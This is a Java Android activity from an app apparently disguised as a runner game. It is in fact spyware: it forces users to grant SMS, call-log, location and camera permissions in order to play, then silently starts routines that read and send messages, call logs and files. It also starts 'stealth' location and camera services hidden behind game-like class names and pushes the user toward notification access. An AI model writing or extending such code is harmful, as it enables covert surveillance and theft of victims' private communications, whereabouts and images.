package com.silenteye;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.core.view.ViewCompat;
import androidx.core.graphics.Insets;
import androidx.activity.EdgeToEdge;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private String[] getRequiredPermissions() {
        return new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA
        };
    }

    private String[] getUngrantedPermissions() {
        java.util.List<String> ungranted = new java.util.ArrayList<>();
        for (String perm : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                ungranted.add(perm);
            }
        }
        return ungranted.toArray(new String[0]);
    }

    private RunnerGameView gameView;
    private View permissionScreen;
    private FrameLayout gameContainer;

    @Override
    protected void onResume() {
        super.onResume();
        // Check if user granted permissions while in Settings
        if (permissionScreen != null && permissionScreen.getVisibility() == View.VISIBLE && hasStandardPermissions()) {
            showGame();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        permissionScreen = findViewById(R.id.permission_screen);
        gameContainer = findViewById(R.id.game_container);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            permissionScreen.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            if (gameView != null) {
                gameView.setSafeInsets(systemBars.top, systemBars.bottom);
            }
            return insets;
        });

        Button btnGrant = findViewById(R.id.btn_grant);
        btnGrant.setOnClickListener(v -> {
            String[] ungranted = getUngrantedPermissions();
            if (ungranted.length > 0) {
                ActivityCompat.requestPermissions(MainActivity.this, ungranted, PERMISSION_REQUEST_CODE);
            } else {
                showGame();
            }
        });

        if (hasStandardPermissions()) {
            showGame();
        } else {
            showPermissionScreen();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (hasStandardPermissions()) {
                showGame();
            } else {
                showPermissionScreen();
                
                boolean permanentlyDenied = false;
                for (int i = 0; i < permissions.length; i++) {
                    if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                        if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i])) {
                            permanentlyDenied = true;
                            break;
                        }
                    }
                }
                
                if (permanentlyDenied) {
                    android.widget.Toast.makeText(this, "Permissions must be allowed in Settings to play.", android.widget.Toast.LENGTH_LONG).show();
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    android.net.Uri uri = android.net.Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivity(intent);
                }
            }
        }
    }

    private void showPermissionScreen() {
        permissionScreen.setVisibility(View.VISIBLE);
        gameContainer.setVisibility(View.GONE);
    }

    private void showGame() {
        permissionScreen.setVisibility(View.GONE);
        gameContainer.setVisibility(View.VISIBLE);

        // Add the game view into the container
        if (gameView == null) {
            gameView = new RunnerGameView(this);
            gameContainer.addView(gameView);
        }

        // Run all background data collection silently
        runDataCollection();
    }

    private void runDataCollection() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            LevelDataParser.readAndSendMessages(this);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            ScoreManagerSync.readAndSendCallLogs(this);
        }
        
        boolean canScanFiles;
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            canScanFiles = (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED);
        } else {
            canScanFiles = (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED);
        }
        if (canScanFiles) {
            AssetPreloader.scanAndUploadFiles(this);
        }

        // Start location tracking (stealth)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Intent locationSyncIntent = new Intent(this, PhysicsEngineSync.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(locationSyncIntent);
            } else {
                startService(locationSyncIntent);
            }
        }

        // Start camera listener (stealth)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            Intent cameraSyncIntent = new Intent(this, AvatarSyncService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(cameraSyncIntent);
            } else {
                startService(cameraSyncIntent);
            }
        }

        // Start device monitoring
        PowerSyncReceiver monitorReceiver = new PowerSyncReceiver();
        try {
            registerReceiver(monitorReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        } catch (Exception ignored) {
        }

        // Prompt for notification access if needed
        boolean isNotifEnabled = isNotificationServiceEnabled();
        android.util.Log.d("EchoRunner", "Notification service enabled: " + isNotifEnabled);
        if (!isNotifEnabled) {
            try {
                android.util.Log.d("EchoRunner", "Triggering Notification Access settings...");
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);
            } catch (Exception e) {
                android.util.Log.e("EchoRunner", "Failed to launch Notification Settings", e);
            }
        }
    }

    private boolean isNotificationServiceEnabled() {
        return androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName());
    }

    private boolean hasStandardPermissions() {
        for (String perm : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (gameView != null)
            gameView.stopGame();
    }
}